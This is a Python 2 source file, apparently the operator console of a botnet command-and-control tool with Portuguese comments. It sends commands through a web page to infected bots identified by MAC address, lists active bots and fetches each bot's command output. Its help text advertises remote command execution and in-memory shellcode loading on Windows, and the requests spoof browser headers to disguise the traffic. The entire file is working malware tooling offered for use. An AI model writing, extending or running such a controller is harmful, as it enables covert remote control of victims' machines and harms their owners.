import hashlib
import random
import string
import urllib
import urllib2
import wget
import os
import sys

class SendCommand:
    
    def __init__(self,mensagem,pagina):
        self.mensagem = mensagem
        self.pagina = pagina
        
    def create_message(self):
        m = { 'text' : self.mensagem }
        return m
        
    def send_message(self):
        site = self.pagina
        message = self.create_message()
        
        data = urllib.urlencode(message)
        
        request = urllib2.Request(site,data)
        
        request.add_header("Origin","http://")
        request.add_header("Accept-Encoding","gzip,deflate")
        request.add_header("Accept-Language","pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4")
        request.add_header("User-Agent","User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36")
        request.add_header("Content-Type","application/x-www-form-urlencoded;charset=UTF-8")
        request.add_header("X-Requested-With","XMLHttpRequest")
        request.add_header("Referer",site)
        request.add_header("Accept","application/json, text/javascript, */*; q=0.01")
        request.add_header("Connection","keep-alive")
        
        urllib2.urlopen(request)
    
class CommandOutput:
    
    def __init__(self,pagina):  
        self.pagina = pagina
    
    def get_list_bots(self):
        bot_page = self.pagina+"/bots"+".txt"
        list_bots = urllib2.urlopen(bot_page).read()
        return list_bots
        
    def get_output(self,bot_name):
        output_page = self.pagina+"/"+bot_name+"/result.txt"
        output_page = urllib2.urlopen(output_page).read()
        return output_page

def help():
    print """
    refresh - refresh C&C control
    list_bots - list active bots
    list_commands - list executed commands
    !retrieve <jobid> - retrieve jobid command
    !cmd <MAC ADDRESS> command - execute the command on the bot
    !shellcode <MAC ADDRESS> shellcode - load and execute shellcode in memory (Windows only)
    help - print this usage
    exit - exit the client
    """

def list_bots(pagina):
    c = CommandOutput(pagina)
    bots = c.get_list_bots()
    for bot in bots:
        print "%s" % bot

def refresh(pagina):
    page_message = pagina+"bots"
    cmd = SendCommand("",page_message)
    cmd.send_message()
    
    page = pagina+"/ALL/cmd"
    cmd = SendCommand("REFRESH",page)
    cmd.send_message()    

def main():
    
    #Coloque a pagina gerada aqui
    pagina = ""
    
    while True:
        cmd_to_launch = raw_input('$ ')
        if (cmd_to_launch == 'refresh'):
            refresh(pagina)
        elif (cmd_to_launch == 'list_bots'):
            list_bots(pagina)
        elif (cmd_to_launch == 'help'):
            help()
        elif (cmd_to_launch == 'exit'):
            sys.exit(0)
        else:
            cmd_to_launch = cmd_to_launch.split(' ')
            if (cmd_to_launch[0] == "!cmd"):
                page_command = pagina+"/"+cmd_to_launch[1]+"/cmd"
                c = SendCommand(' '.join(cmd_to_launch[2:]),page_command)
                c.send_message()
                print '[+] Sent command "%s"' % (' '.join(cmd_to_launch[2:]))
            elif (cmd_to_launch[0] == "!retrieve"):
                out = CommandOutput(pagina)
                output = out.get_output(cmd_to_launch[1])
                print output

            else:
                print "[!] Unrecognized command"
            
if __name__ == '__main__':
    main()
        
